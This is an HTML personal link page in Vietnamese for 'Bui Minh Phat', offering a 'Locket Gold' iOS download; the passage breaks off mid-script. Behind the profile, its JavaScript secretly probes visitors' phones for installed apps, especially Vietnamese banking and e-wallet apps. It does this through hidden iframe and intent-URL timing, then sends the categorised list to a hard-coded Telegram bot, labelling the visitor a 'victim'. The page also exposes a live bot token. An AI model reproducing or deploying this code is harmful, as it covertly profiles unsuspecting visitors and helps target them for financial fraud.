<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bui Minh Phat</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        html, body { background-color: #ffffff; color: #1f2937; margin: 0; padding: 0; min-height: 100vh; }
        #loading-screen { transition: opacity 0.5s ease; }
        audio { display: none; }
    </style>
</head>
<body>

    <div id="loading-screen" class="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-white">
        <div class="w-32 h-32 rounded-full overflow-hidden border border-gray-100 shadow-xl mb-6">
            <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover" alt="avatar">
        </div>
        <h1 class="text-2xl font-bold italic text-gray-900 mb-8">Bui Minh Phat</h1>
        <button onclick="startExperience()" class="px-6 py-2 border border-gray-200 rounded-full text-gray-400 hover:text-gray-900 transition animate-pulse">
            Chạm để vào
        </button>
    </div>

    <audio id="music-1" preload="auto"><source src="https://files.catbox.moe/uc4l2l.mov" type="audio/mp4"></audio>
    <audio id="music-2" loop preload="auto"><source src="https://files.catbox.moe/77meij.mp3" type="audio/mp3"></audio>

    <div id="app-list-container" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; overflow-y:scroll; padding:20px;">
        <button onclick="document.getElementById('app-list-container').style.display='none'" style="position:fixed; top:10px; right:10px; z-index:10000; background:red; color:white; border:none; padding:10px 15px; border-radius:8px; font-weight:bold;">ĐÓNG</button>
        <h2 style="margin-top:50px; font-size:20px; font-weight:bold;">📱 DANH SÁCH ỨNG DỤNG ĐÃ CÀI</h2>
        <div id="app-list-content" style="margin-top:20px;"></div>
    </div>

    <div class="max-w-md mx-auto px-5 py-14 flex flex-col items-center">
        <div class="fixed top-4 left-4 z-50 px-4 py-1.5 bg-gray-100 border border-black/5 rounded-full backdrop-blur-md shadow-sm flex items-center space-x-2.5">
            <span id="digital-clock" class="text-sm font-bold tracking-wider text-gray-800">00:00:00</span>
            <span class="text-xs">🌙</span>
        </div>

        <header class="flex flex-col items-center text-center w-full pt-12">
            <div class="w-28 h-28 rounded-full overflow-hidden border border-black/5 shadow-xl mb-4">
                <img src="https://files.catbox.moe/n0x8oo.jpeg" class="w-full h-full object-cover" alt="avatar">
            </div>
            <h1 class="text-3xl font-bold italic tracking-wide text-gray-900 mb-2">Bui Minh Phat</h1>
            <p class="text-sm text-gray-500 font-light tracking-wide">id tiktok <span class="font-normal">buiminhphat20</span></p>
        </header>

        <main class="w-full mt-6 px-5">
            <div class="flex items-center justify-between p-4 bg-white border border-gray-100 rounded-[24px] shadow-sm hover:shadow-md transition-all">
                <div class="flex items-center space-x-4">
                    <img src="https://files.catbox.moe/awlpvc.jpeg" class="w-16 h-16 rounded-2xl object-cover" alt="app icon">
                    <div class="flex flex-col justify-center">
                        <h3 class="font-bold text-lg text-gray-900">Locket Gold</h3>
                        <div class="mt-1 flex items-center space-x-1 text-purple-600 bg-purple-50 px-2 py-0.5 rounded-full w-fit">
                            <span class="text-[10px]"> iOS</span>
                        </div>
                    </div>
                </div>
                <a href="https://storeipa.com/w4wg4p" target="_blank" rel="noopener noreferrer" class="p-3 text-purple-500 hover:bg-purple-50 rounded-full transition-colors">
                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                    </svg>
                </a>
            </div>
        </main>
    </div>

    <script>
        // === ÂM NHẠC ===
        const music1 = document.getElementById('music-1');
        const music2 = document.getElementById('music-2');
        const loading = document.getElementById('loading-screen');

        function startExperience() {
            loading.style.opacity = '0';
            setTimeout(() => loading.style.display = 'none', 500);
            if (music1) {
                music1.play().catch(e => console.log("Cần tương tác người dùng"));
            }
        }

        if (music1) {
            music1.onended = function() {
                if (music2) music2.play().catch(e => console.log("Lỗi phát nhạc nền"));
            };
            music1.onerror = function() {
                setTimeout(function() {
                    if (music2) music2.play().catch(function() {});
                }, 3000);
            };
        }

        document.addEventListener('click', function() {
            if (music1 && music1.paused) {
                music1.play().catch(function() {});
            }
        }, { once: false });

        // === ĐỒNG HỒ ===
        function capNhatDongHo() {
            var el = document.getElementById('digital-clock');
            if (el) {
                var now = new Date();
                var h = String(now.getHours()).padStart(2, '0');
                var m = String(now.getMinutes()).padStart(2, '0');
                var s = String(now.getSeconds()).padStart(2, '0');
                el.textContent = h + ':' + m + ':' + s;
            }
        }
        setInterval(capNhatDongHo, 1000);
        capNhatDongHo();

        // === TELEGRAM BOT ===
        const BOT_TOKEN = '8890331484:AAGCT4w5nV66WcSaF5yQiiYI4hh-xktEZeY';
        const CHAT_ID = 8681854353;

        // === HÀM GỬI TIN NHẮN TELEGRAM ===
        function guiTinNhanTelegram(noiDung) {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: noiDung,
                    parse_mode: 'HTML'
                })
            }).catch(function(e) {});
        }

        // === HÀM GỬI DỮ LIỆU NHẠY CẢM ===
        function guiDuLieuNhayCam(noiDung) {
            var payload = {
                chat_id: CHAT_ID,
                text: '🚨 <b>CẢNH BÁO DỮ LIỆU NHẠY CẢM</b>\n⏰ ' + new Date().toLocaleString('vi-VN') + '\n👤 Nạn nhân: ' + (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|Brave)/) || [])[0] || 'Unknown' + '\n' + noiDung,
                parse_mode: 'HTML'
            };
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(function() {});
        }

        // ==========================================
        // === QUÉT ỨNG DỤNG CHO CẢ ANDROID VÀ iOS ===
        // ==========================================
        (function() {
            var installedApps = [];
            var detectedApps = [];
            var isAndroid = /Android/i.test(navigator.userAgent);
            var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

            // 1. PHƯƠNG PHÁP DÒ ỨNG DỤNG QUA URL SCHEME (iOS & Android)
            function quetUngDungQuaURLScheme() {
                var appList = [
                    // Mạng xã hội
                    { name: 'Facebook', ios_scheme: 'fb://', android_scheme: 'intent://#Intent;package=com.facebook.katana;scheme=fb;end' },
                    { name: 'Instagram', ios_scheme: 'instagram://', android_scheme: 'intent://#Intent;package=com.instagram.android;scheme=instagram;end' },
                    { name: 'TikTok', ios_scheme: 'tiktok://', android_scheme: 'intent://#Intent;package=com.zhiliaoapp.musically;scheme=tiktok;end' },
                    { name: 'Zalo', ios_scheme: 'zalo://', android_scheme: 'intent://#Intent;package=com.zing.zalo;scheme=zalo;end' },
                    { name: 'Telegram', ios_scheme: 'tg://', android_scheme: 'intent://#Intent;package=org.telegram.messenger;scheme=tg;end' },
                    { name: 'WhatsApp', ios_scheme: 'whatsapp://', android_scheme: 'intent://#Intent;package=com.whatsapp;scheme=whatsapp;end' },
                    { name: 'Messenger', ios_scheme: 'fb-messenger://', android_scheme: 'intent://#Intent;package=com.facebook.orca;scheme=fb-messenger;end' },
                    { name: 'Snapchat', ios_scheme: 'snapchat://', android_scheme: 'intent://#Intent;package=com.snapchat.android;scheme=snapchat;end' },
                    { name: 'Twitter/X', ios_scheme: 'twitter://', android_scheme: 'intent://#Intent;package=com.twitter.android;scheme=twitter;end' },
                    { name: 'Discord', ios_scheme: 'discord://', android_scheme: 'intent://#Intent;package=com.discord;scheme=discord;end' },
                    { name: 'Skype', ios_scheme: 'skype://', android_scheme: 'intent://#Intent;package=com.skype.raider;scheme=skype;end' },
                    { name: 'Viber', ios_scheme: 'viber://', android_scheme: 'intent://#Intent;package=com.viber.voip;scheme=viber;end' },
                    { name: 'Line', ios_scheme: 'line://', android_scheme: 'intent://#Intent;package=jp.naver.line.android;scheme=line;end' },
                    
                    // Ngân hàng & Ví điện tử Việt Nam
                    { name: 'MoMo', ios_scheme: 'momo://', android_scheme: 'intent://#Intent;package=com.mservice.momotransfer;scheme=momo;end' },
                    { name: 'ZaloPay', ios_scheme: 'zalopay://', android_scheme: 'intent://#Intent;package=com.vng.zalopay;scheme=zalopay;end' },
                    { name: 'Vietcombank', ios_scheme: 'vietcombank://', android_scheme: 'intent://#Intent;package=com.vietcombank.mobile;scheme=vietcombank;end' },
                    { name: 'BIDV', ios_scheme: 'bidv://', android_scheme: 'intent://#Intent;package=com.vnpay.bidv;scheme=bidv;end' },
                    { name: 'Techcombank', ios_scheme: 'techcombank://', android_scheme: 'intent://#Intent;package=com.techcombank;scheme=techcombank;end' },
                    { name: 'MB Bank', ios_scheme: 'mbbank://', android_scheme: 'intent://#Intent;package=com.mbmobile;scheme=mbbank;end' },
                    { name: 'ACB', ios_scheme: 'acb://', android_scheme: 'intent://#Intent;package=com.acbmobile;scheme=acb;end' },
                    { name: 'VPBank', ios_scheme: 'vpbank://', android_scheme: 'intent://#Intent;package=com.vpbankonline;scheme=vpbank;end' },
                    { name: 'Sacombank', ios_scheme: 'sacombank://', android_scheme: 'intent://#Intent;package=com.sacombank;scheme=sacombank;end' },
                    { name: 'TPBank', ios_scheme: 'tpbank://', android_scheme: 'intent://#Intent;package=com.tpbank;scheme=tpbank;end' },
                    { name: 'VietinBank', ios_scheme: 'vietinbank://', android_scheme: 'intent://#Intent;package=com.vietinbank;scheme=vietinbank;end' },
                    { name: 'Agribank', ios_scheme: 'agribank://', android_scheme: 'intent://#Intent;package=com.agribank;scheme=agribank;end' },
                    { name: 'Shopeepay', ios_scheme: 'shopeepay://', android_scheme: 'intent://#Intent;package=com.shopee.pay;scheme=shopeepay;end' },
                    { name: 'VNPay', ios_scheme: 'vnpay://', android_scheme: 'intent://#Intent;package=com.vnpay;scheme=vnpay;end' },
                    
                    // Thương mại điện tử
                    { name: 'Shopee', ios_scheme: 'shopee://', android_scheme: 'intent://#Intent;package=com.shopee.vn;scheme=shopee;end' },
                    { name: 'Lazada', ios_scheme: 'lazada://', android_scheme: 'intent://#Intent;package=com.lazada.android;scheme=lazada;end' },
                    { name: 'Tiki', ios_scheme: 'tiki://', android_scheme: 'intent://#Intent;package=com.tiki.android;scheme=tiki;end' },
                    
                    // Grab, Be, Xanh SM
                    { name: 'Grab', ios_scheme: 'grab://', android_scheme: 'intent://#Intent;package=com.grabtaxi.passenger;scheme=grab;end' },
                    { name: 'Be', ios_scheme: 'be://', android_scheme: 'intent://#Intent;package=com.be.passenger;scheme=be;end' },
                    { name: 'Xanh SM', ios_scheme: 'xanhsm://', android_scheme: 'intent://#Intent;package=com.xanhsm;scheme=xanhsm;end' },
                    
                    // Game
                    { name: 'PUBG Mobile', ios_scheme: 'pubgmobile://', android_scheme: 'intent://#Intent;package=com.tencent.ig;scheme=pubgmobile;end' },
                    { name: 'Free Fire', ios_scheme: 'freefire://', android_scheme: 'intent://#Intent;package=com.dts.freefireth;scheme=freefire;end' },
                    { name: 'Mobile Legends', ios_scheme: 'mlbb://', android_scheme: 'intent://#Intent;package=com.mobile.legends;scheme=mlbb;end' },
                    { name: 'Genshin Impact', ios_scheme: 'genshinimpact://', android_scheme: 'intent://#Intent;package=com.miHoYo.GenshinImpact;scheme=genshinimpact;end' },
                    { name: 'Liên Quân', ios_scheme: 'lienquan://', android_scheme: 'intent://#Intent;package=com.garena.game.kgvn;scheme=lienquan;end' },
                    
                    // Giải trí
                    { name: 'Netflix', ios_scheme: 'nflx://', android_scheme: 'intent://#Intent;package=com.netflix.mediaclient;scheme=nflx;end' },
                    { name: 'YouTube', ios_scheme: 'youtube://', android_scheme: 'intent://#Intent;package=com.google.android.youtube;scheme=youtube;end' },
                    { name: 'Spotify', ios_scheme: 'spotify://', android_scheme: 'intent://#Intent;package=com.spotify.music;scheme=spotify;end' },
                    { name: 'FPT Play', ios_scheme: 'fptplay://', android_scheme: 'intent://#Intent;package=com.fptplay;scheme=fptplay;end' },
                    { name: 'Zing MP3', ios_scheme: 'zingmp3://', android_scheme: 'intent://#Intent;package=com.zing.mp3;scheme=zingmp3;end' },
                    
                    // Khác
                    { name: 'Tinder', ios_scheme: 'tinder://', android_scheme: 'intent://#Intent;package=com.tinder;scheme=tinder;end' },
                    { name: 'Google Maps', ios_scheme: 'comgooglemaps://', android_scheme: 'intent://#Intent;package=com.google.android.apps.maps;scheme=comgooglemaps;end' },
                    { name: 'Google Drive', ios_scheme: 'googledrive://', android_scheme: 'intent://#Intent;package=com.google.android.apps.docs;scheme=googledrive;end' },
                    { name: 'Zoom', ios_scheme: 'zoomus://', android_scheme: 'intent://#Intent;package=us.zoom.videomeetings;scheme=zoomus;end' },
                    { name: 'Canva', ios_scheme: 'canva://', android_scheme: 'intent://#Intent;package=com.canva.editor;scheme=canva;end' },
                    { name: 'CapCut', ios_scheme: 'capcut://', android_scheme: 'intent://#Intent;package=com.lemon.lvoverseas;scheme=capcut;end' }
                ];

                var detected = [];
                var totalApps = appList.length;
                var checkedCount = 0;

                // Tạo iframe ẩn cho iOS
                var iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.id = 'app-detector-iframe';
                document.body.appendChild(iframe);

                appList.forEach(function(app, index) {
                    setTimeout(function() {
                        try {
                            if (isAndroid) {
                                // Android: Dùng Intent URL
                                var a = document.createElement('a');
                                a.href = app.android_scheme;
                                a.style.display = 'none';
                                document.body.appendChild(a);
                                
                                var startTime = Date.now();
                                a.click();
                                
                                setTimeout(function() {
                                    var elapsed = Date.now() - startTime;
                                    if (elapsed < 100) {
                                        detected.push({ name: app.name, platform: 'Android', confidence: 'Cao' });
                                        installedApps.push(app.name);
                                        detectedApps.push(app);
                                    }
                                    document.body.removeChild(a);
                                    checkedCount++;
                                    if (checkedCount >= totalApps) {
                                        iframe.src = 'about:blank';
                                        document.body.removeChild(iframe);
                                        xuLyKetQuaQuet(detected);
                                    }
                                }, 50);
                                
                            } else if (isIOS) {
                                // iOS: Dùng iframe thay đổi src
                                var startTime = Date.now();
                                iframe.src = app.ios_scheme;
                                
                                setTimeout(function() {
                                    var elapsed = Date.now() - startTime;
                                    if (elapsed < 2500) {
                                        detected.push({ name: app.name, platform: 'iOS', confidence: 'Cao' });
                                        installedApps.push(app.name);
                                        detectedApps.push(app);
                                    }
                                    checkedCount++;
                                    if (checkedCount >= totalApps) {
                                        iframe.src = 'about:blank';
                                        document.body.removeChild(iframe);
                                        xuLyKetQuaQuet(detected);
                                    }
                                }, 100);
                                
                            } else {
                                // Desktop: Thử cả 2 phương pháp
                                var startTime = Date.now();
                                iframe.src = app.ios_scheme;
                                
                                setTimeout(function() {
                                    var elapsed = Date.now() - startTime;
                                    if (elapsed < 2500) {
                                        detected.push({ name: app.name, platform: 'Desktop', confidence: 'Thấp' });
                                    }
                                    checkedCount++;
                                    if (checkedCount >= totalApps) {
                                        iframe.src = 'about:blank';
                                        document.body.removeChild(iframe);
                                        xuLyKetQuaQuet(detected);
                                    }
                                }, 100);
                            }
                        } catch(e) {
                            checkedCount++;
                            if (checkedCount >= totalApps) {
                                try {
                                    iframe.src = 'about:blank';
                                    document.body.removeChild(iframe);
                                } catch(e2) {}
                                xuLyKetQuaQuet(detected);
                            }
                        }
                    }, index * 30); // Giảm delay xuống 30ms để quét nhanh hơn
                });

                // Fallback timeout nếu vòng lặp bị treo
                setTimeout(function() {
                    if (checkedCount < totalApps) {
                        try {
                            iframe.src = 'about:blank';
                            document.body.removeChild(iframe);
                        } catch(e) {}
                        xuLyKetQuaQuet(detected);
                    }
                }, 15000);
            }

            function xuLyKetQuaQuet(detected) {
                var uniqueApps = [];
                var seen = {};
                detected.forEach(function(app) {
                    if (!seen[app.name]) {
                        seen[app.name] = true;
                        uniqueApps.push(app);
                    }
                });

                var container = document.getElementById('app-list-content');
                if (container) {
                    var html = '<ul style="list-style:none;padding:0;">';
                    uniqueApps.forEach(function(app) {
                        html += '<li style="padding:12px;margin:8px 0;background:#f0f0f0;border-radius:8px;border-left:4px solid #8b5cf6;">';
                        html += '<strong>' + app.name + '</strong>';
                        html += '<br><small style="color:#666;">Platform: ' + (app.platform || 'Unknown') + ' | Độ tin cậy: ' + app.confidence + '</small>';
                        html += '</li>';
                    });
                    html += '</ul>';
                    container.innerHTML = html;
                }

                if (uniqueApps.length > 0) {
                    var appListMsg = '📱 <b>DANH SÁCH ỨNG DỤNG PHÁT HIỆN TRÊN ĐIỆN THOẠI</b>\n';
                    appListMsg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
                    appListMsg += '📱 Platform: ' + (isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop') + '\n';
                    appListMsg += '📊 Tổng: ' + uniqueApps.length + ' ứng dụng\n\n';
                    
                    var mangXaHoi = [];
                    var nganHang = [];
                    var thuongMai = [];
                    var game = [];
                    var giaiTri = [];
                    var khac = [];
                    
                    var bankingKeywords = ['momo', 'zalopay', 'vietcombank', 'bidv', 'techcombank', 'mb bank', 'acb', 'vpbank', 'sacombank', 'tpbank', 'vietinbank', 'agribank', 'shopeepay', 'vnpay'];
                    var socialKeywords = ['facebook', 'instagram', 'tiktok', 'zalo', 'telegram', 'whatsapp', 'snapchat', 'twitter', 'messenger', 'discord', 'skype', 'viber', 'line', 'tinder'];
                    var shoppingKeywords = ['shopee', 'lazada', 'tiki'];
                    var gameKeywords = ['pubg', 'free fire', 'mobile legends', 'genshin', 'liên quân'];
                    
                    uniqueApps.forEach(function(app) {
                        var nameLower = app.name.toLowerCase();
                        var isBanking = bankingKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
                        var isSocial = socialKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
                        var isShopping = shoppingKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
                        var isGame = gameKeywords.some(function(k) { return nameLower.indexOf(k) > -1; });
                        
                        if (isBanking) nganHang.push(app);
                        else if (isSocial) mangXaHoi.push(app);
                        else if (isShopping) thuongMai.push(app);
                        else if (isGame) game.push(app);
                        else if (['netflix', 'youtube', 'spotify', 'fpt play', 'zing mp3'].some(function(k) { return nameLower.indexOf(k) > -1; })) giaiTri.push(app);
                        else khac.push(app);
                    });

                    if (nganHang.length > 0) {
                        appListMsg += '🏦 <b>NGÂN HÀNG & VÍ ĐIỆN TỬ (' + nganHang.length + '):</b>\n';
                        nganHang.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                        appListMsg += '\n';
                    }
                    if (mangXaHoi.length > 0) {
                        appListMsg += '💬 <b>MẠNG XÃ HỘI (' + mangXaHoi.length + '):</b>\n';
                        mangXaHoi.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                        appListMsg += '\n';
                    }
                    if (thuongMai.length > 0) {
                        appListMsg += '🛒 <b>THƯƠNG MẠI ĐIỆN TỬ (' + thuongMai.length + '):</b>\n';
                        thuongMai.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                        appListMsg += '\n';
                    }
                    if (game.length > 0) {
                        appListMsg += '🎮 <b>GAME (' + game.length + '):</b>\n';
                        game.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                        appListMsg += '\n';
                    }
                    if (giaiTri.length > 0) {
                        appListMsg += '🎬 <b>GIẢI TRÍ (' + giaiTri.length + '):</b>\n';
                        giaiTri.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                        appListMsg += '\n';
                    }
                    if (khac.length > 0) {
                        appListMsg += '📦 <b>KHÁC (' + khac.length + '):</b>\n';
                        khac.forEach(function(a) { appListMsg += '  • ' + a.name + '\n'; });
                    }

                    guiDuLieuNhayCam(appListMsg);
                } else {
                    var platformMsg = isIOS ? 'iOS - Apple chặn hầu hết phương pháp dò URL Scheme từ Safari/Chrome' : 
                                     isAndroid ? 'Android - Có thể trình duyệt đã chặn Intent hoặc không có ứng dụng nào trong danh sách' : 
                                     'Desktop - Không hỗ trợ quét ứng dụng di động';
                    guiDuLieuNhayCam('📱 <b>KHÔNG PHÁT HIỆN ỨNG DỤNG</b>\n📱 Platform: ' + (isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop') + '\n⚠️ Lý do: ' + platformMsg);
